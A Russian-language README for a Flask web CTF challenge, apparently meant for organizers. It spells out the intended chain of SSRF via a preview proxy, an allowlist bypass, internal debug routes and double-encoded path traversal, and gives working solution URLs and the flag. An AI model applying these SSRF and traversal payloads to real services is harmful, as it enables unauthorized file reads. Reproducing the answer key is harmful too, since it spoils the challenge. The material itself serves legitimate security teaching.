# KubMail: Архив, который всё помнит

WEB CTF-задача средней сложности для Flask/Python. Docker не нужен.

## Запуск

```bash
python3 -m venv .venv
source .venv/bin/activate       # Windows: .venv\\Scripts\\activate
pip install -r requirements.txt
python app.py
```

Откройте http://127.0.0.1:5000.

## Для организатора

Это многошаговая задача на цепочку **SSRF → внутренний debug endpoint → gateway ticket → path traversal**. Идея вдохновлена классом parser discrepancy/SSRF и проблемами обхода файловых обработчиков, включая CVE-2021-41773 как тематическую отсылку, но реализация учебная.

Игроку нужно самостоятельно обнаружить `/api/docs`, найти preview-прокси, обойти наивный allowlist через строку `kubmail.local` в query части URL, обратиться к localhost, получить внутренний маршрут и ticket, а затем использовать двойное декодирование имени файла.

Флаг: `KubSTU{kuban_legacy_gateway_reads_between_the_lines}`

Рекомендуемый путь для проверки:

```text
/api/preview?url=http://127.0.0.1:5000/internal/health?via=kubmail.local
/api/preview?url=http://127.0.0.1:5000/internal/debug/routes?via=kubmail.local
/api/preview?url=http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local
```

В последнем URL символы `&` лучше передавать в URL-encoded виде `%26`, чтобы они остались частью параметра `url` внешнего запроса.

Для раздачи участникам удалите раздел `Для организатора`.
